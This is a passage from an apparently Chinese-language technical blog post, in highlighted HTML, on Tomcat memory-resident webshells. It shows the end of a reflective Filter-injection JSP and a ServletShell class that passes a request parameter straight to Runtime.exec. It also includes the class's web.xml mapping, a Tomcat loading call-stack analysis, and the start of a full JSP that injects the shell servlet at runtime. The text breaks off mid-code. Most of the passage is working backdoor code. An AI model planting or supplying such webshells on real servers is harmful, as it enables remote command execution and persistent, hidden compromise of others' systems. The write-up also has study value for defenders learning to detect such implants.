punctuation\">(</span><span class=\"token class-name\">FiterName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    filterDef<span class=\"token punctuation\">.</span><span class=\"token function\">setFilterClass</span><span class=\"token punctuation\">(</span>filter<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    standardContext<span class=\"token punctuation\">.</span><span class=\"token function\">addFilterDef</span><span class=\"token punctuation\">(</span>filterDef<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n    <span class=\"token class-name\">FilterMap</span> filterMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FilterMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    filterMap<span class=\"token punctuation\">.</span><span class=\"token function\">addURLPattern</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    filterMap<span class=\"token punctuation\">.</span><span class=\"token function\">setFilterName</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">FiterName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    filterMap<span class=\"token punctuation\">.</span><span class=\"token function\">setDispatcher</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DispatcherType</span><span class=\"token punctuation\">.</span>REQUEST<span class=\"token punctuation\">.</span><span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    standardContext<span class=\"token punctuation\">.</span><span class=\"token function\">addFilterMapBefore</span><span class=\"token punctuation\">(</span>filterMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n    <span class=\"token class-name\">Field</span> <span class=\"token class-name\">Config</span> <span class=\"token operator\">=</span> standardContext<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"filterConfigs\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Config</span><span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">HashMap</span> filterConfigs <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">Config</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>standardContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n\n    <span class=\"token class-name\">Constructor</span> constructor <span class=\"token operator\">=</span> <span class=\"token class-name\">ApplicationFilterConfig</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Context</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">FilterDef</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    constructor<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">ApplicationFilterConfig</span> filterConfig <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ApplicationFilterConfig</span><span class=\"token punctuation\">)</span> constructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>standardContext<span class=\"token punctuation\">,</span>filterDef<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    filterConfigs<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">FiterName</span><span class=\"token punctuation\">,</span> filterConfig<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>  不管获得StandardContext还是添加filterConfigs其实都有不少的代码实现，但思路大概差不太多，这里只是写一种方法。</p>\n<h2 id=\"Servlet内存马\"><a href=\"#Servlet内存马\" class=\"headerlink\" title=\"Servlet内存马\"></a>Servlet内存马</h2><p>  在开始时看到有师傅用两个接口来实现内存马，分别是Servlet和HttpServlet，HttpServlet在Servlet的基础上添加了HTTP协议的处理方法，不在直接使用Servlet的service方法，而是对于Http的不同请求，分别调用doGet和doPost方法。虽然接口不同，但调用到底层差不多，这里选择实现HttpServlet来分析。<br>编写Servlet恶意类：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ServletShell</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">HttpServlet</span><span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> req<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> resp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> command2 <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>command2 <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">InputStream</span> in <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>command2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NullPointerException</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                n<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> req<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> resp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">,</span> resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在web.xml注册：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>servlet<span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token operator\">&lt;</span>servlet<span class=\"token operator\">-</span>name<span class=\"token operator\">&gt;</span><span class=\"token class-name\">ServletShell</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>servlet<span class=\"token operator\">-</span>name<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>servlet<span class=\"token operator\">-</span><span class=\"token keyword\">class</span><span class=\"token operator\">&gt;</span><span class=\"token class-name\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span></span>Servlet<span class=\"token punctuation\">.</span>ServletShell</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>servlet<span class=\"token operator\">-</span><span class=\"token keyword\">class</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>servlet<span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span>servlet<span class=\"token operator\">-</span>mapping<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>servlet<span class=\"token operator\">-</span>name<span class=\"token operator\">&gt;</span><span class=\"token class-name\">ServletShell</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>servlet<span class=\"token operator\">-</span>name<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>url<span class=\"token operator\">-</span>pattern<span class=\"token operator\">&gt;</span><span class=\"token comment\">/*&lt;/url-pattern&gt;\n&lt;/servlet-mapping&gt;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这次在ContextConfig#webconfig打断点，此方法的主要作用在于读取web.xml以及其他配置操作，可以较为形象的跟踪servlet的读取过程。<br>查看调用栈：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">webConfig<span class=\"token operator\">:</span><span class=\"token number\">1264</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ContextConfig</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>startup<span class=\"token punctuation\">)</span>\nconfigureStart<span class=\"token operator\">:</span><span class=\"token number\">986</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ContextConfig</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>startup<span class=\"token punctuation\">)</span>\nlifecycleEvent<span class=\"token operator\">:</span><span class=\"token number\">303</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ContextConfig</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>startup<span class=\"token punctuation\">)</span>\nfireLifecycleEvent<span class=\"token operator\">:</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">LifecycleBase</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">)</span>\nstartInternal<span class=\"token operator\">:</span><span class=\"token number\">5135</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">StandardContext</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\nstart<span class=\"token operator\">:</span><span class=\"token number\">183</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">LifecycleBase</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">)</span>\naddChildInternal<span class=\"token operator\">:</span><span class=\"token number\">726</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ContainerBase</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\naddChild<span class=\"token operator\">:</span><span class=\"token number\">698</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ContainerBase</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\naddChild<span class=\"token operator\">:</span><span class=\"token number\">696</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">StandardHost</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">)</span>\nmanageApp<span class=\"token operator\">:</span><span class=\"token number\">1783</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">HostConfig</span> <span class=\"token punctuation\">(</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>catalina<span class=\"token punctuation\">.</span>startup<span class=\"token punctuation\">)</span>\ninvoke0<span class=\"token operator\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NativeMethodAccessorImpl</span> <span class=\"token punctuation\">(</span>sun<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">)</span>\ninvoke<span class=\"token operator\">:</span><span class=\"token number\">62</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NativeMethodAccessorImpl</span> <span class=\"token punctuation\">(</span>sun<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">)</span>\ninvoke<span class=\"token operator\">:</span><span class=\"token number\">43</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">DelegatingMethodAccessorImpl</span> <span class=\"token punctuation\">(</span>sun<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>里面的fireLifecycleEvent解析调用了web.xml内容</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">fireLifecycleEvent</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> type<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> data<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">LifecycleEvent</span> event <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LifecycleEvent</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Iterator</span> var4 <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>lifecycleListeners<span class=\"token punctuation\">.</span><span class=\"token function\">iterator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>var4<span class=\"token punctuation\">.</span><span class=\"token function\">hasNext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">LifecycleListener</span> listener <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">LifecycleListener</span><span class=\"token punctuation\">)</span>var4<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        listener<span class=\"token punctuation\">.</span><span class=\"token function\">lifecycleEvent</span><span class=\"token punctuation\">(</span>event<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>从而webconfig调用此解析内容进行配置，将内容通过configureContext来创建StandWrapper</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>ok<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">configureContext</span><span class=\"token punctuation\">(</span>webXml<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    webXml<span class=\"token punctuation\">.</span><span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>tomcatWebXml<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    webXml<span class=\"token punctuation\">.</span><span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>defaults<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">convertJsps</span><span class=\"token punctuation\">(</span>webXml<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">configureContext</span><span class=\"token punctuation\">(</span>webXml<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在后面通过：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span><span class=\"token function\">addServletMappingDecoded</span><span class=\"token punctuation\">(</span>urlPattern<span class=\"token punctuation\">,</span> jspServletName<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>进行url路径的添加，因为加载顺序是Listener-&gt;Filter-&gt;Servlet，所以还要之间还要对Listener，Filter进行加载，到后由loadOnStartup加载之前的wrapper，其中有一个判断需要注意下：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>loadOnStartup <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Integer</span> key <span class=\"token operator\">=</span> loadOnStartup<span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Wrapper</span><span class=\"token punctuation\">&gt;</span></span> list <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ArrayList</span><span class=\"token punctuation\">)</span>map<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>list <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        list <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        map<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>wrapper<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>也就是说loadOnStartup大于等于0才会进行后续的操作（其实设置为0也不会进行），这个属性默认-1，表示启动的优先级，往后就成功加载了Servlet了。<br>其中configureContext在创建Wrapper时规定了几个必要的属性：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">LoadOnStartup</span>属性：\nwrapper<span class=\"token punctuation\">.</span><span class=\"token function\">setLoadOnStartup</span><span class=\"token punctuation\">(</span>servlet<span class=\"token punctuation\">.</span><span class=\"token function\">getLoadOnStartup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">intValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">ServletName</span>属性：\nwrapper<span class=\"token punctuation\">.</span><span class=\"token function\">setName</span><span class=\"token punctuation\">(</span>servlet<span class=\"token punctuation\">.</span><span class=\"token function\">getServletName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">ServletClass</span>属性：\nwrapper<span class=\"token punctuation\">.</span><span class=\"token function\">setServletClass</span><span class=\"token punctuation\">(</span>servlet<span class=\"token punctuation\">.</span><span class=\"token function\">getServletClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>那我们加载的代码逻辑就在创建wrapper后，分别设置LoadOnStartup属性、ServletName属性以及ServletClass属性，最后通过addChild以及addServletMappingDecoded进行加载到对应路径，完整代码如下：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.lang.reflect.Field\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span> <span class=\"token string\">\"javax.servlet.ServletException\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.catalina.core.StandardContext\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.catalina.connector.Request\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.io.IOException\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"org.apache.catalina.Wrapper\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page <span class=\"token keyword\">import</span><span class=\"token operator\">=</span><span class=\"token string\">\"java.io.InputStream\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>@ page contentType<span class=\"token operator\">=</span><span class=\"token string\">\"text/html;charset=UTF-8\"</span> language<span class=\"token operator\">=</span><span class=\"token string\">\"java\"</span> <span class=\"token operator\">%</span><span class=\"token operator\">&gt;</span>\n\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">%</span>\n     <span class=\"token keyword\">class</span> <span class=\"token class-name\">ServletShell</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">HttpServlet</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token annotation punctuation\">@Override</span>\n        <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doGet</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> req<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> resp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">String</span> command <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"servletshell\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>command <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token class-name\">InputStream</span> in <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">NullPointerException</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    n<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n\n\n         <span class=\"token annotation punctuation\">@Override</span>\n         <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doPost</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> req<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> resp<span class=\"token punctuation\">)</span> <span 